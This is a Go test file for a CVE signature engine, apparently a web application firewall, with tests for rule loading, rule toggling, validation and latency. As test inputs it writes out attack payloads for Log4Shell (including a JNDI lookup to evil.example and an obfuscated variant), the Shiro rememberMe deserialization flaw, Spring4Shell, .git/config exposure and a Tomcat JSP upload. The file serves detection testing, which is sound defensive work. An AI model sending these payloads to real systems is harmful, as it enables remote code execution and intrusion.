package cve

import (
	"net/http"
	"testing"
	"time"
)

func newEngine(t *testing.T) *Engine {
	t.Helper()
	eng, err := NewBundled()
	if err != nil {
		t.Fatalf("NewBundled: %v", err)
	}
	return eng
}

func TestBundledLibraryLoads(t *testing.T) {
	eng := newEngine(t)
	rules := eng.Rules()
	if len(rules) < 50 {
		t.Fatalf("bundled library too small: %d rules", len(rules))
	}
	if _, err := BundledRules(); err != nil {
		t.Fatalf("BundledRules: %v", err)
	}

	categories := map[string]int{}
	for _, r := range rules {
		categories[r.Category]++
	}
	if categories[CatRCE] == 0 || categories[CatAuthBypass] == 0 || categories[CatInfoDisclosure] == 0 {
		t.Fatalf("expected rce/auth-bypass/info-disclosure groups, got %v", categories)
	}
}

func TestLog4ShellBlocked(t *testing.T) {
	eng := newEngine(t)
	m, ok := eng.Evaluate(&Input{
		Method:   http.MethodGet,
		Path:     "/app",
		RawQuery: "user=${jndi:ldap://evil.example/a}",
	})
	if !ok {
		t.Fatal("expected Log4Shell match")
	}
	if m.Rule.ID != "CVE-2021-44228" {
		t.Errorf("rule = %s, want CVE-2021-44228", m.Rule.ID)
	}
}

func TestLog4ShellViaUserAgentHeader(t *testing.T) {
	eng := newEngine(t)
	h := http.Header{}
	h.Set("User-Agent", "${${lower:jndi}${lower::}${lower:l}dap://x}")
	m, ok := eng.Evaluate(&Input{Method: http.MethodGet, Path: "/", Headers: map[string][]string{"User-Agent": h.Values("User-Agent")}})
	if !ok {
		t.Fatal("expected obfuscated Log4j match via header scan")
	}
	if m.Rule.Category != CatRCE {
		t.Errorf("category = %s", m.Rule.Category)
	}
}

func TestShiroRememberMeDeserializationBlocked(t *testing.T) {
	eng := newEngine(t)
	// yso serialized payload base64 starts with rO0AB (aced 0005 magic)
	cookie := "rememberMe=deleteMe; rememberMe=rO0ABXNyADFvcmcuYXBhY2hlLnNoaXJvLmNyeXB0bw"
	h := map[string][]string{"Cookie": []string{cookie}}
	m, ok := eng.Evaluate(&Input{Method: http.MethodGet, Path: "/", Headers: h})
	if !ok {
		t.Fatal("expected Shiro rememberMe deserialization match")
	}
	if m.Rule.ID != "CVE-2016-4437" {
		t.Errorf("rule = %s, want CVE-2016-4437", m.Rule.ID)
	}
}

func TestSpring4ShellBlocked(t *testing.T) {
	eng := newEngine(t)
	body := []byte("class.module.classLoader=org.apache.catalina.loader&file=jsp")
	m, ok := eng.Evaluate(&Input{Method: http.MethodPost, Path: "/", Body: body})
	if !ok {
		t.Fatal("expected Spring4Shell match via body")
	}
	if m.Rule.ID != "CVE-2022-22965" {
		t.Errorf("rule = %s, want CVE-2022-22965", m.Rule.ID)
	}
}

func TestGitConfigDisclosureBlocked(t *testing.T) {
	eng := newEngine(t)
	m, ok := eng.Evaluate(&Input{Method: http.MethodGet, Path: "/site/.git/config"})
	if !ok {
		t.Fatal("expected .git/config disclosure match")
	}
	if m.Rule.ID != "GIT-CONFIG-EXPOSURE" {
		t.Errorf("rule = %s, want GIT-CONFIG-EXPOSURE", m.Rule.ID)
	}
}

func TestMethodGatedRulesOnlyFireOnTheirMethod(t *testing.T) {
	eng := newEngine(t)

	// CVE-2017-12615 is PUT-only: a GET to a .jsp path must not match it.
	if _, ok := eng.Evaluate(&Input{Method: http.MethodGet, Path: "/index.jsp"}); ok {
		t.Fatal("PUT-gated rule fired on GET")
	}
	m, ok := eng.Evaluate(&Input{Method: http.MethodPut, Path: "/shell.jsp"})
	if !ok || m.Rule.ID != "CVE-2017-12615" {
		t.Fatalf("expected CVE-2017-12615 on PUT, got %+v ok=%v", m, ok)
	}
}

func TestRuleToggleDisablesSignature(t *testing.T) {
	eng := newEngine(t)
	payload := &Input{Method: http.MethodGet, Path: "/.git/config"}

	if _, ok := eng.Evaluate(payload); !ok {
		t.Fatal("expected default-enabled match")
	}

	eng.SetEnabled(map[string]struct{}{"GIT-CONFIG-EXPOSURE": {}})
	if _, ok := eng.Evaluate(payload); ok {
		t.Fatal("disabled rule still fired")
	}
	if got := eng.DisabledIDs(); len(got) != 1 || got[0] != "GIT-CONFIG-EXPOSURE" {
		t.Fatalf("DisabledIDs = %v", got)
	}

	eng.SetEnabled(nil)
	if _, ok := eng.Evaluate(payload); !ok {
		t.Fatal("re-enabled rule did not fire")
	}
}

func TestEngineWideDisable(t *testing.T) {
	eng := newEngine(t)
	eng.SetEnabled(map[string]struct{}{"*": {}})
	if _, ok := eng.Evaluate(&Input{Method: http.MethodGet, Path: "/.git/config"}); ok {
		t.Fatal("engine-wide disable did not suppress evaluation")
	}
}

func TestValidationRejectsBadRules(t *testing.T) {
	if _, err := NewEngine([]Signature{{ID: "X"}}); err == nil {
		t.Fatal("expected error for missing matches")
	}
	if _, err := NewEngine([]Signature{
		{ID: "A", Matches: []TokenRef{{Field: FieldPath, Token: "x"}}},
		{ID: "A", Matches: []TokenRef{{Field: FieldPath, Token: "y"}}},
	}); err == nil {
		t.Fatal("expected duplicate-id error")
	}
	if _, err := NewEngine([]Signature{{ID: "B", Matches: []TokenRef{{Field: "aura", Token: "x"}}}}); err == nil {
		t.Fatal("expected unknown-field error")
	}
}

func TestFastPathLatencyBudget(t *testing.T) {
	eng := newEngine(t)
	in := &Input{
		Method:   http.MethodGet,
		Path:     "/api/v1/users/42",
		RawQuery: "page=2&size=25",
		Headers:  map[string][]string{"Accept": {"application/json"}},
	}
	// Warm up index pointers.
	eng.Evaluate(in)

	start := time.Now()
	const iterations = 10000
	for range iterations {
		eng.Evaluate(in)
	}
	perOp := time.Since(start) / iterations
	if perOp > 40*time.Microsecond {
		t.Fatalf("fast path too slow: %v/op", perOp)
	}
}
